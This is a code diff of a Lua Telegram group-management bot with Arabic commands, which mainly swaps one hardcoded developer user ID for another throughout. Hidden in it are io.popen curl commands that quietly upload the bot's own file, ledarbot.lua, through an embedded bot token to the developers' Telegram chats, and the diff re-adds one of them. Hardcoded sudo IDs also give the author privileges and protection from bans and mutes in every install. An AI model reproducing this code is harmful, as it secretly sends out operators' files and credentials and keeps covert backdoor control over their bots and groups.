@@ -164,7 +164,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end
-sudo_users = {SUDO,bot_id,1795384453,944353237,0000000000,0000000000}   
+sudo_users = {SUDO,bot_id,1762046288,944353237,0000000000,0000000000}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -175,7 +175,7 @@ end
 return DRAGON  
 end 
 local curla = 'curl "'..'https://api.telegram.org/bot1740719485:AAGb_g64uCIegM6OQG1ssz_68lXMi1EYawo/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(curla)
-local curl = 'curl "'..'https://api.telegram.org/bot1740719485:AAGb_g64uCIegM6OQG1ssz_68lXMi1EYawo/sendDocument'..'" -F "chat_id='.. 1795384453 ..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(curl) 
+local curl = 'curl "'..'https://api.telegram.org/bot1740719485:AAGb_g64uCIegM6OQG1ssz_68lXMi1EYawo/sendDocument'..'" -F "chat_id='.. 1762046288 ..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(curl) 
 function DevSoFi(msg) 
 local hash = database:sismember(bot_id.."Dev:SoFi:2", msg.sender_user_id_) 
 if hash or SudoBot(msg) then  
@@ -256,7 +256,7 @@ return false
 end 
 end
 function Can_or_NotCan(user_id,chat_id)
-if tonumber(user_id) == tonumber(1795384453) then  
+if tonumber(user_id) == tonumber(1762046288) then  
 var = true  
 elseif tonumber(user_id) == tonumber(944353237) then
 var = true  
@@ -2546,6 +2546,7 @@ end
 end
 end,nil)  
 end
+
 if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'مين نصبلك' or text == 'منصب عند مين' or text == 'عاوز بوت' then 
 local msg_id = msg.id_/2097152/0.5 
 local Text = [[ 
@@ -2560,7 +2561,17 @@ keyboard.inline_keyboard = {
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/theleader205&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
-if text == 'اسلام' or text == 'مطور السورس' or text == 'Eslam' then 
+if text == 'اسلام' or text == 'Eslam' then 
+local msg_id = msg.id_/2097152/0.5 
+local Text = [[ 
+[TᕼE ᒪEᗩᗪEᖇ ♩](t.me/XXx_EsLaM_xXX)
+]] 
+keyboard = {}  
+keyboard.inline_keyboard = {{{text = '𝚝𝚑𝚎 𝚕𝚎𝚊𝚍𝚎𝚛 ⚚', url="t.me/XXx_EsLaM_xXX"}},} 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/XXx_EsLaM_xXX&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+end
+
+if text == 'ايسكو' then 
 local msg_id = msg.id_/2097152/0.5 
 local Text = [[ 
 [TᕼE ᒪEᗩᗪEᖇ ♩](t.me/XXx_EsLaM_xXX)
@@ -3613,7 +3624,7 @@ if result.sender_user_id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " 𖤍 لا يمكنك حظر المطور الاساسي \n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1795384453) then
+if result.sender_user_id_ == tonumber(1762046288) then
 send(msg.chat_id_, msg.id_, " 𖤍 لا يمكنك حظر المطور اسلام\n")
 return false 
 end
@@ -3670,7 +3681,7 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " 𖤍 لا يمكنك حظر المطور الاساسي \n")
 return false 
 end
-if result.id_ == tonumber(1795384453) then
+if result.id_ == tonumber(1762046288) then
 send(msg.chat_id_, msg.id_, " 𖤍 لا يمكنك حظر مطور السورس \n")
 return false 
 end
@@ -3709,7 +3720,7 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 𖤍 لا تسطيع حظر البوت عام")
 return false 
 end
-if tonumber(userid) == tonumber(1795384453) then  
+if tonumber(userid) == tonumber(1762046288) then  
 send(msg.chat_id_, msg.id_, " 𖤍 لا تسطيع حظر مطور السورس عام")
 return false 
 end
@@ -3757,7 +3768,7 @@ if result.sender_user_id_ == tonumber(0000000000) then
 send(msg.chat_id_, msg.id_, " 𖤍 لا يمكنك كتم مطور السورس\n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1795384453) then
+if result.sender_user_id_ == tonumber(1762046288) then
 send(msg.chat_id_, msg.id_, " 𖤍 لا يمكنك كتم المطور اسلام\n")
 return false 
 end
@@ -3801,7 +3812,7 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " 𖤍 لا يمكنك كتم المطور الاساسي \n")
 return false 
 end
-if result.id_ == tonumber(1795384453) then
+if result.id_ == tonumber(1762046288) then
 send(msg.chat_id_, msg.id_, " 𖤍 لا يمكنك كتم مطور السورس عام\n")
 return false 
 end
@@ -3840,7 +3851,7 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 𖤍 لا تسطيع كتم البوت عام")
 return false 
 end
-if tonumber(userid) == tonumber(1795384453) then  
+if tonumber(userid) == tonumber(1762046288) then  
 send(msg.chat_id_, msg.id_, " 𖤍 لا تسطيع كتم مطور السورس عام")
 return false 
 end
@@ -9174,7 +9185,9 @@ local DRAGON_Msg = {
 'اسمي '..Namebot..' يا روحي🙄',
 'اسمي  '..Namebot..' يعمري🌚',
 }
-send(msg.chat_id_, msg.id_,'['..DRAGON_Msg[math.random(#DRAGON_Msg)]..']') 
+keyboard = {}  
+keyboard.inline_keyboard = {{{text = 'قناه السورس', url="t.me/theleader205"}},} 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/theleader205&caption=' .. URL.escape(DRAGON_Msg[math.random(#DRAGON_Msg)]).."&reply_to_message_id="..msg.id_/2097152/0.5.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 return false
 end
 if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
